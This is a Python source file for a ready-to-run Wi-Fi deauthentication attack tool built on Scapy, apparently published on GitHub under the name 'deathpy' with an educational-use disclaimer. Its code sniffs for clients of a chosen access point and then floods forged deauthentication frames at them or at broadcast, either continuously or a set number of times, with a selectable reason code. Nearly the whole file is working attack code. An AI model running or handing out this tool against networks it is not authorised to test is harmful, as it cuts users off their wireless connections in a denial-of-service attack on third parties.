#!/usr/bin/python3
#
#--------------------------------------------------------------------------------------------------------------------------
# Author: Rofi (Fixploit03)
# GitHub: https://github.com/fixploit03/deathpy
# Copyright (c) 2025 - Rofi (Fixploit03)
#--------------------------------------------------------------------------------------------------------------------------
# DISCLAIMER:
#
# This program is created solely for educational and learning purposes about wireless network security (Wi-Fi).
# Usage of this program should only be conducted on networks or devices that you own or have explicit permission
# from the owner to test their security. Using this program for illegal purposes, such as disrupting, infiltrating,
# or damaging networks without permission, is unlawful in many jurisdictions and may result in serious legal consequences,
# including fines or imprisonment.
#
# The creator (Rofi/Fixploit03) is not responsible for any misuse or damage caused by the use of this program.
# You, as the user, are fully responsible for your own actions and must comply with the laws and regulations applicable
# in your region.
#
# This program is designed to help understand how deauthentication attacks work in a controlled and legal environment,
# such as a cybersecurity lab or authorized penetration testing. We strongly recommend that you study hacking ethics
# and relevant laws BEFORE using this program. Do not use this program for malicious purposes or without proper authorization
# from the relevant parties.
#
# By using this program, you acknowledge that you understand the risks, responsibilities, and legal limitations,
# and agree to use it only in a lawful and ethical context for educational or authorized security testing purposes.
#--------------------------------------------------------------------------------------------------------------------------

# --- Import Section: Modules required for the program ---
import sys          # System operations like exiting and platform checking
import time         # Timing and delay operations
import re           # Regular expressions for validating MAC address format
import os           # Operating system interactions
import signal       # Signal handling (e.g., CTRL+C)
import argparse     # Command-line argument parsing
import platform     # Detailed operating system information
from scapy.all import *  # Network packet manipulation and sending
from termcolor import colored  # Colored terminal output

# --- Global Variables ---
stop_attack = False  # Flag to stop the attack when CTRL+C is pressed

# --- Function Definitions ---

def signal_handler(sig, frame):
    """
    Handle the CTRL+C signal to gracefully stop the deauthentication attack.

    Args:
        sig (int): Signal number (e.g., SIGINT for CTRL+C).
        frame (frame): Current stack frame.

    Returns:
        None: Exits the program with status code 0 after stopping the attack.
    """
    global stop_attack
    time_str = colored(get_current_time(), 'cyan')
    print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("INFO", 'green', attrs=['bold']) + colored("] ", 'white') + colored("CTRL+C detected. Stopping deauthentication attack...", 'white'))
    stop_attack = True
    sys.exit(0)

def get_current_time():
    """
    Retrieve the current time formatted as HH:MM:SS.

    Returns:
        str: Current time in "HH:MM:SS" format.
    """
    return time.strftime("%H:%M:%S")

def validate_mac(mac):
    """
    Validate the format of a MAC address.

    Args:
        mac (str): MAC address to validate (e.g., "00:11:22:33:44:55").

    Returns:
        str: The validated MAC address if valid.

    Raises:
        ValueError: If the MAC address format is invalid.
    """
    if not re.match(r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$', mac):
        raise ValueError(f"Invalid MAC address format: {mac}")
    return mac

def check_root():
    """
    Ensure the program is running with root privileges.

    Returns:
        None: Exits with status code 1 if not running as root.
    """
    if os.geteuid() != 0:
        time_str = colored(get_current_time(), 'cyan')
        print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("ERROR", 'red', attrs=['bold']) + colored("] ", 'white') + colored("Please run the program as root!", 'white'))
        sys.exit(1)

def check_interface_exists(interface):
    """
    Verify that the specified network interface exists on the system.

    Args:
        interface (str): Network interface name (e.g., "wlan0").

    Returns:
        None: Exits with status code 1 if the interface does not exist.
    """
    interfaces = os.listdir("/sys/class/net/")
    if interface not in interfaces:
        time_str = colored(get_current_time(), 'cyan')
        print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("ERROR", 'red', attrs=['bold']) + colored("] ", 'white') + colored(f"Interface {interface} not found!", 'white'))
        sys.exit(1)

def check_interface_mode(interface):
    """
    Check if the specified network interface is in monitor mode.

    Args:
        interface (str): Network interface name (e.g., "wlan0").

    Returns:
        None: Exits with status code 1 if not in monitor mode or if an error occurs.
    """
    try:
        result = os.popen(f"iwconfig {interface}").read()
        if "Mode:Monitor" not in result:
            time_str = colored(get_current_time(), 'cyan')
            print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("ERROR", 'red', attrs=['bold']) + colored("] ", 'white') + colored("Interface is not in monitor mode!", 'white'))
            sys.exit(1)
    except Exception as e:
        time_str = colored(get_current_time(), 'cyan')
        print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("ERROR", 'red', attrs=['bold']) + colored("] ", 'white') + colored(f"Error checking interface mode: {e}", 'white'))
        sys.exit(1)

def create_deauth_packet(bssid, client, reason=1):
    """
    Create a deauthentication packet using Scapy with a specified reason code.

    Args:
        bssid (str): MAC address of the target Access Point (AP).
        client (str): MAC address of the target client or "ff:ff:ff:ff:ff:ff" for broadcast.
        reason (int, optional): Deauthentication reason code (default is 1).

    Returns:
        scapy.packet.Packet: A crafted deauthentication packet.
    """
    pkt = RadioTap() / Dot11(addr1=client, addr2=bssid, addr3=bssid) / Dot11Deauth(reason=reason)
    return pkt

def scan_clients(interface, bssid, channel, timeout=30, verbose=False):
    """
    Scan for clients connected to the specified access point.

    Args:
        interface (str): Network interface in monitor mode.
        bssid (str): MAC address of the target AP.
        channel (int): Channel of the target AP.
        timeout (int, optional): Duration of the scan in seconds (default is 30).
        verbose (bool, optional): Enable detailed output (default is False).

    Returns:
        list: List of client MAC addresses found.
    """
    clients = set()
    try:
        os.system(f"iwconfig {interface} channel {channel}")
    except Exception as e:
        time_str = colored(get_current_time(), 'cyan')
        print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("ERROR", 'red', attrs=['bold']) + colored("] ", 'white') + colored(f"Error setting channel: {e}", 'white'))
        sys.exit(1)
    
    def packet_handler(pkt):
        """Callback function to process sniffed packets and extract client MACs."""
        if pkt.haslayer(Dot11) and pkt.addr2 == bssid and pkt.addr1 != "ff:ff:ff:ff:ff:ff":
            client_mac = pkt.addr1
            if client_mac not in clients:
                clients.add(client_mac)
                if verbose:
                    time_str = colored(get_current_time(), 'cyan')
                    print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("INFO", 'green', attrs=['bold']) + colored("] ", 'white') + colored(f"Found client: {client_mac}", 'white'))
    
    time_str = colored(get_current_time(), 'cyan')
    print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("INFO", 'green', attrs=['bold']) + colored("] ", 'white') + colored(f"Scanning for clients for {timeout} seconds...", 'white'))
    sniff(iface=interface, prn=packet_handler, timeout=timeout)
    return list(clients)

def send_deauth_packets(interface, bssid, clients, count, channel, interval=0, reason=1, is_manual_client=False, verbose=False):
    """
    Send deauthentication packets to specified clients or broadcast with a specified reason code.

    Args:
        interface (str): Network interface in monitor mode.
        bssid (str): MAC address of the target AP.
        clients (list): List of client MAC addresses to target.
        count (int): Number of packets to send per client (0 for continuous).
        channel (int): Channel of the target AP.
        interval (float, optional): Delay between packets in seconds (default is 0).
        reason (int, optional): Deauthentication reason code (default is 1).
        is_manual_client (bool, optional): True if client was manually specified (default is False).
        verbose (bool, optional): Enable detailed output (default is False).

    Returns:
        None: Exits with status code 1 on error.
    """
    try:
        if not clients:
            time_str = colored(get_current_time(), 'cyan')
            print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("INFO", 'green', attrs=['bold']) + colored("] ", 'white') + colored("No clients found, switching to broadcast mode.", 'white'))
            clients = ["ff:ff:ff:ff:ff:ff"]
        elif is_manual_client:
            time_str = colored(get_current_time(), 'cyan')
            print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("INFO", 'green', attrs=['bold']) + colored("] ", 'white') + colored(f"Targeting specified client: {clients}", 'white'))
        else:
            time_str = colored(get_current_time(), 'cyan')
            print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("INFO", 'green', attrs=['bold']) + colored("] ", 'white') + colored(f"Found {len(clients)} clients: {clients}", 'white'))

        bssid = validate_mac(bssid)
        os.system(f"iwconfig {interface} channel {channel}")

        packet_sent_logged = False

        if count == 0:
            time_str = colored(get_current_time(), 'cyan')
            print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("INFO", 'green', attrs=['bold']) + colored("] ", 'white') + colored(f"Starting continuous deauthentication attack (interval: {interval}s, reason code: {reason})...", 'white'))
            packet_number = 1
            while not stop_attack:
                for client_mac in clients:
                    packet = create_deauth_packet(bssid, client_mac, reason)
                    sendp(packet, iface=interface, verbose=0)
                    time_str = colored(get_current_time(), 'cyan')
                    if verbose:
                        if client_mac != "ff:ff:ff:ff:ff:ff":
                            print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("INFO", 'green', attrs=['bold']) + colored("] ", 'white') + colored(f"Sending packet {packet_number} to {bssid} (CLIENT: {client_mac})", 'white'))
                        else:
                            print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("INFO", 'green', attrs=['bold']) + colored("] ", 'white') + colored(f"Sending packet {packet_number} to {bssid} (broadcast mode)", 'white'))
                    elif not packet_sent_logged:
                        print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("INFO", 'green', attrs=['bold']) + colored("] ", 'white') + colored(f"Sending packet to {bssid}", 'white'))
                        packet_sent_logged = True
                    packet_number += 1
                    time.sleep(interval)
        else:
            total_packets = count * len(clients)
            time_str = colored(get_current_time(), 'cyan')
            print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("INFO", 'green', attrs=['bold']) + colored("] ", 'white') + colored(f"Starting deauthentication attack with {count} packets per client (total: {total_packets}, interval: {interval}s, reason code: {reason})...", 'white'))
            packet_number = 1
            for client_mac in clients:
                if stop_attack:
                    break
                for i in range(count):
                    if stop_attack:
                        break
                    packet = create_deauth_packet(bssid, client_mac, reason)
                    sendp(packet, iface=interface, verbose=0)
                    time_str = colored(get_current_time(), 'cyan')
                    if verbose:
                        if client_mac != "ff:ff:ff:ff:ff:ff":
                            print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("INFO", 'green', attrs=['bold']) + colored("] ", 'white') + colored(f"Sending packet {packet_number}/{total_packets} to {bssid} (CLIENT: {client_mac})", 'white'))
                        else:
                            print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("INFO", 'green', attrs=['bold']) + colored("] ", 'white') + colored(f"Sending packet {packet_number}/{total_packets} to {bssid} (broadcast mode)", 'white'))
                    elif not packet_sent_logged:
                        print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("INFO", 'green', attrs=['bold']) + colored("] ", 'white') + colored(f"Sending packet to {bssid}", 'white'))
                        packet_sent_logged = True
                    packet_number += 1
                    time.sleep(interval)

        time_str = colored(get_current_time(), 'cyan')
        print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("INFO", 'green', attrs=['bold']) + colored("] ", 'white') + colored("Deauthentication attack completed.", 'white'))

    except PermissionError:
        time_str = colored(get_current_time(), 'cyan')
        print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("ERROR", 'red', attrs=['bold']) + colored("] ", 'white') + colored("Permission denied: Please ensure you have the necessary privileges!", 'white'))
        sys.exit(1)
    except Exception as e:
        time_str = colored(get_current_time(), 'cyan')
        print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("ERROR", 'red', attrs=['bold']) + colored("] ", 'white') + colored(f"Error during deauthentication attack: {e}", 'white'))
        sys.exit(1)

def main():
    """
    Main function to coordinate the execution of the deauthentication attack program.

    This function performs initial checks, parses command-line arguments, and orchestrates
    the scanning and sending of deauthentication packets.

    Returns:
        None: Exits with status code 1 on error.
    """
    # Check if the operating system is Linux
    os_name = platform.system()
    if os_name != "Linux":
        time_str = colored(get_current_time(), 'cyan')
        print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("ERROR", 'red', attrs=['bold']) + colored("] ", 'white') + colored(f"This program is only supported on Linux! Detected OS: {os_name}", 'white'))
        sys.exit(1)

    # Set up signal handler for CTRL+C
    signal.signal(signal.SIGINT, signal_handler)
    
    # Ensure root privileges
    check_root()

    # Program description for help menu
    description = (
        "WiFi Deauthentication Attack Program\n"
        "Author: Rofi (Fixploit03)\n"
        "GitHub: https://github.com/fixploit03/deauther\n"
        "Copyright (c) 2025 Rofi (Fixploit03). All rights reserved."
    )

    # Set up argument parser
    parser = argparse.ArgumentParser(
        description=description,
        formatter_class=argparse.RawTextHelpFormatter
    )
    
    parser.add_argument("interface", help="Network interface in monitor mode (e.g., wlan0)")
    parser.add_argument("-b", "--bssid", required=True, help="BSSID of the target AP (e.g., 00:11:22:33:44:55)")
    parser.add_argument("-c", "--channel", type=int, required=True, help="Channel of the target AP (e.g., 6)")
    parser.add_argument("-a", "--client", help="Client MAC to deauth (e.g., 66:77:88:99:AA:BB)")
    parser.add_argument("-n", "--count", type=int, default=0, help="Number of packets to send per client (default: 0, continuous)")
    parser.add_argument("-t", "--timeout", type=int, default=30, help="Client scan timeout in seconds (default: 30)")
    parser.add_argument("-i", "--interval", type=float, default=0, help="Interval between packet sends in seconds (default: 0)")
    parser.add_argument(
        "-r", "--reason", 
        type=int, 
        choices=[1, 2, 3, 4, 5, 7, 8, 9, 14, 15], 
        default=1, 
        help=(
            "Deauthentication reason code (default: 1). Available options:\n"
            "  1: Unspecified reason - Generic reason, no specific cause.\n"
            "  2: Previous authentication no longer valid - Prior auth expired or invalid.\n"
            "  3: Deauthenticated because sending STA is leaving - Station is disconnecting.\n"
            "  4: Disassociated due to inactivity - No activity from the station.\n"
            "  5: Disassociated because AP is unable to handle all associated STAs - AP overloaded.\n"
            "  7: Class 3 frame received from nonassociated station - Unauthorized frame.\n"
            "  8: Disassociated because sending STA is leaving BSS - Station leaving network.\n"
            "  9: STA requesting association is not authenticated - Authentication required.\n"
            " 14: MIC failure (Message Integrity Check) - Security protocol violation.\n"
            " 15: 4-way handshake timeout - Failed to complete security handshake."
        )
    )
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output")

    # Parse command-line arguments
    args = parser.parse_args()

    # Validate network interface
    check_interface_exists(args.interface)
    check_interface_mode(args.interface)

    try:
        # If no client is specified, scan for connected clients
        if args.client is None:
            clients = scan_clients(args.interface, args.bssid, args.channel, args.timeout, verbose=args.verbose)
            send_deauth_packets(args.interface, args.bssid, clients, args.count, args.channel, args.interval, args.reason, is_manual_client=False, verbose=args.verbose)
        # If a client is specified, use it directly
        else:
            clients = [validate_mac(args.client)]
            send_deauth_packets(args.interface, args.bssid, clients, args.count, args.channel, args.interval, args.reason, is_manual_client=True, verbose=args.verbose)

    except ValueError as ve:
        time_str = colored(get_current_time(), 'cyan')
        print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("ERROR", 'red', attrs=['bold']) + colored("] ", 'white') + colored(f"Error: {ve}", 'white'))
        sys.exit(1)
    except Exception as e:
        time_str = colored(get_current_time(), 'cyan')
        print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("ERROR", 'red', attrs=['bold']) + colored("] ", 'white') + colored(f"Critical error: {e}", 'white'))
        sys.exit(1)

# --- Execution Entry Point ---
if __name__ == "__main__":
    main()
